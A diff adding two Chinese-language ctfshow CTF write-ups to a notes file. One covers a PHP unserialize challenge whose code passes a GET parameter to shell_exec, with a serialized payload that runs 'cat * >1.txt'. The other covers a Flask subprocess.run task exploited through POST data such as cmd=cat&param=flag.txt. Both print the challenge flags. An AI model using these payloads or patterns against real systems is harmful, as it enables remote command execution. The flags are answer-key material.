@@ -4458,6 +4458,164 @@ function check($str){
 
 ------
 
+### Webshell
+
+PHP代码审计后，发现这道题的考点是PHP反序列化。
+
+```php
+<?php 
+    error_reporting(0);
+    class Webshell {
+        public $cmd = 'echo "Hello World!"';
+
+        public function __construct() {
+            $this->init();
+        }
+
+        public function init() {
+            if (!preg_match('/flag/i', $this->cmd)) {
+                $this->exec($this->cmd);
+            }
+        }
+
+        public function exec($cmd) {
+            $result = shell_exec($cmd);
+            echo $result;
+        }
+    }
+
+    if(isset($_GET['cmd'])) {
+        $serializecmd = $_GET['cmd'];
+        $unserializecmd = unserialize($serializecmd);
+        $unserializecmd->init();
+    }
+    else {
+        highlight_file(__FILE__);
+    }
+?>
+```
+
+当PHP生成一个 `Webshell` 对象时，会自动调用 `__construct()` → `init()`。`init()` 检查 `$this->cmd` 是否包含 `flag`（忽略大小写），若不包含，则执行命令。最终通过 `shell_exec($this->cmd)` 执行系统命令。
+
+编写PHP反序列化代码求解，得到`O:8:"Webshell":1:{s:3:"cmd";s:12:"cat * >1.txt";}`。
+
+```php
+<?php 
+class Webshell {
+    public $cmd = 'cat * >1.txt';
+}
+$a = new Webshell();
+echo serialize($a);
+?>
+```
+
+访问`/1.txt`可以看到`flag`信息。
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:14:07
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:14:17
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+$flag = 'ctfshow{050cfa45-a8cb-4a68-8444-c8f02703dd16}';
+<?php 
+    error_reporting(0);
+
+    class Webshell {
+        public $cmd = 'echo "Hello World!"';
+
+        public function __construct() {
+            $this->init();
+        }
+
+        public function init() {
+            if (!preg_match('/flag/i', $this->cmd)) {
+                $this->exec($this->cmd);
+            }
+        }
+
+        public function exec($cmd) {
+            $result = shell_exec($cmd);
+            echo $result;
+        }
+    }
+
+    if(isset($_GET['cmd'])) {
+        $serializecmd = $_GET['cmd'];
+        $unserializecmd = unserialize($serializecmd);
+        $unserializecmd->init();
+    }
+    else {
+        highlight_file(__FILE__);
+    }
+
+?>
+```
+
+提交`ctfshow{050cfa45-a8cb-4a68-8444-c8f02703dd16}`即可。
+
+------
+
+### easyPytHon_P
+
+`python`代码审计题，考察在Flask环境中如何利用`subprocess.run()`执行命令。
+
+```python
+源码在此：
+
+from flask import request
+cmd: str = request.form.get('cmd')
+param: str = request.form.get('param')
+# --------------------------- Don't modify ↑ them ↑! But you can write your code ↓
+import subprocess, os
+if cmd is not None and param is not None:
+    try:
+        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
+        print('Done!')
+    except subprocess.TimeoutExpired:
+        print('Timeout!')
+    except:
+        print('Error!')
+else:
+    print('No Flag!')
+
+如果环境出现故障，请访问<a href="/recover">这里</a>尝试恢复。
+
+大菜鸡敬上！
+```
+
+subpeocess模块下的run函数可以执行命令，其具体的参数有很多：第一个参数`args`是个`list`，包括要执行的命令`cmd`，命令参数`param`，当前文件路径`__file__`；而`cwd`为当前工作路径，`os.getcwd()`是返回进程的当前工作目录；`timeout`表示等待超时的时间设置为5s。
+
+用`HackBar`构造`POST`请求，执行命令`ls -l`，`POST`数据为`cmd=ls&param=-l`，靶机显示内容如下：
+
+```
+-rw-rw-r-- 1 root root 490 Jan 18 09:27 evilSource.py Done!
+```
+
+执行命令`ls ./`查看当前路径的文件目录，`POST`数据为`cmd=ls&param=./`，靶机显示内容如下：
+
+```
+evilSource.py ./: app.py evilSource.py flag.txt start.sh Done!
+```
+
+执行命令`cat flag.txt`查看`flag`文件，POST数据为`cmd=cat&param=flag.txt`，靶机显示内容如下：
+
+```
+ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str = ['cat', 'flag.txt'][0] param: str = ['cat', 'flag.txt'][1] # ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓ import subprocess, os if cmd is not None and param is not None: try: tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5) print('Done!') except subprocess.TimeoutExpired: print('Timeout!') except: print('Error!') else: print('No Flag!')Done!
+```
+
+提交`ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282}`即可。
+
+------
+
 ## [sqli-labs](https://github.com/Audi-1/sqli-labs)
 
 ### Less-1
